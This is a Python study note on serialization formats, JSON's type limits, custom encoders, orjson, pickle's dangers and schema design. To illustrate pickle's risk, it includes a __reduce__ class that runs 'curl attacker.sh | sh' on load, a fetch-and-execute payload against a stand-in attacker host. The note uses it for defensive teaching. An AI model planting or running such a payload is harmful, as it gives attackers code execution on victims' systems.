# Serialization

#python #serialization #json #pickle

> **In one line:** Serialization turns objects into bytes and back. JSON is the lingua franca but knows only six types, pickle knows every Python type but executes code when loading, and the real work is deciding the schema at the boundary, which is the job Pydantic does.

---

## The Formats

| Format | Types | Human-readable | Cross-language | Speed | Safe on untrusted input? |
|---|---|---|---|---|---|
| **JSON** | object, array, string, number, bool, null | Yes | Yes | Medium (`orjson`: fast) | Yes |
| **pickle** | Almost any Python object | No | **Python only** | Fast | **No — arbitrary code execution** |
| **MessagePack** | JSON-like plus binary | No | Yes | Fast, compact | Yes |
| **Protobuf** | Schema-defined | No | Yes | Fast, compact | Yes |
| **Avro** | Schema-defined (schema stored with or beside the data) | No | Yes | Fast | Yes |
| **YAML** | JSON plus more | Yes | Yes | Slow | Only with `safe_load` |
| **CSV** | Strings only | Yes | Yes | Medium | Yes, but watch formula injection in spreadsheets |

Backend rule of thumb: **JSON at public edges, Protobuf for internal RPC ([[gRPC]]), Avro or Protobuf with a schema registry for event streams ([[10.6 - Schema Registry and Compatibility]]), never pickle across a trust boundary.**

## JSON in Python

```python
import json

json.dumps({"id": 1, "tags": ["a"]})            # str
json.loads('{"id": 1}')                         # dict
json.dumps(obj, separators=(",", ":"))          # compact
json.dumps(obj, sort_keys=True)                 # stable output for hashing and caching
json.dumps(obj, ensure_ascii=False)             # keep UTF-8 instead of \uXXXX escapes
```

### What JSON cannot represent

```python
json.dumps({"when": datetime.now()})   # TypeError: Object of type datetime is not JSON serializable
json.dumps({1: "a"})                   # '{"1": "a"}' — int keys silently become strings
json.dumps((1, 2))                     # '[1, 2]' — tuples come back as lists
json.dumps(Decimal("1.10"))            # TypeError
json.dumps(float("nan"))               # 'NaN' — NOT valid JSON; many parsers reject it. Use allow_nan=False
json.dumps({1, 2})                     # TypeError: sets
```

A **round trip is lossy**. `loads(dumps(x)) == x` fails for tuples, int keys, datetimes, Decimals and sets. This is the core argument for parsing into typed models at the boundary.

### Custom encoding

```python
from datetime import datetime, date
from decimal import Decimal
from uuid import UUID

def default(o):
    if isinstance(o, (datetime, date)):
        return o.isoformat()
    if isinstance(o, (Decimal, UUID)):
        return str(o)
    if isinstance(o, (set, frozenset)):
        return sorted(o)
    raise TypeError(f"not serialisable: {type(o).__name__}")

json.dumps(payload, default=default)
```

Decoding the other way (`object_hook`) is clumsy, because JSON has no type tags. The usual answer is: **decode to plain data, then validate into a model.** That is Pydantic's job ([[07.3 - Pydantic Fundamentals]]).

### Fast JSON

```python
import orjson
orjson.dumps(obj)            # bytes, not str; datetime, UUID, dataclass and numpy supported natively
orjson.loads(b)
```

`orjson` is often 5–10x faster than `json` and handles common types out of the box. FastAPI can use it via `ORJSONResponse`, and Pydantic v2's own Rust serializer (`model_dump_json`) is fast too. See [[Assets.3 - Numbers To Know]] for real numbers.

### Big numbers and IDs

JavaScript numbers are doubles: integers above 2⁵³ lose precision. A 64-bit Snowflake ID sent as a JSON number can arrive in a browser altered. **Send 64-bit IDs as strings.** Send money as a string decimal or as integer minor units ([[01.3 - Numbers That Bite]]).

## pickle: Powerful and Dangerous

```python
import pickle
data = pickle.dumps(obj)           # any picklable Python object: classes, nested structures, cycles
obj2 = pickle.loads(data)
```

How it works: pickle writes a small **program** for a stack-based virtual machine that rebuilds the object. Objects control this through `__reduce__`, which says "call this callable with these arguments". So:

```python
class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("curl attacker.sh | sh",))

pickle.loads(pickle.dumps(Evil()))     # runs the shell command during LOADING
```

⚠️ **Never unpickle data you did not produce yourself and protect from tampering.** That includes: pickles from caches that others can write to, user uploads, ML model files from the internet (the reason `safetensors` exists), and Celery messages when the broker is not trusted (which is why Celery defaults to JSON).

Where pickle is legitimate: `multiprocessing` (passing work to child processes, [[01.3 - Threads Processes and Coroutines]]), short-term local caching of your own objects, and `copy.deepcopy` (which uses the same `__reduce__` protocol).

Other pickle gotchas: pickles refer to classes **by import path**, so renaming or moving a class breaks old pickles; lambdas and local functions cannot be pickled; and objects holding sockets, locks or DB connections cannot be pickled.

## Schema Thinking

Every serialised format is a contract between producer and consumer. The questions that matter more than the format:

| Question | Bad answer | Good answer |
|---|---|---|
| Who validates input? | "The code that uses it, eventually" | A model at the boundary (Pydantic, JSON Schema) |
| What happens with unknown fields? | Silently kept or silently dropped | A conscious choice: `extra="forbid"` for requests, `"ignore"` for tolerant consumers |
| How do you evolve it? | Rename fields freely | Add optional fields; never reuse or retype a field; version when you must ([[06.13 - Contract Testing and Schema Evolution]]) |
| How are dates, money and IDs encoded? | Whatever the default encoder did | ISO 8601 with timezone, string decimals or minor units, string IDs |

JSON Schema is the shared language for this: OpenAPI is built on it, and Pydantic generates it (`Model.model_json_schema()`).
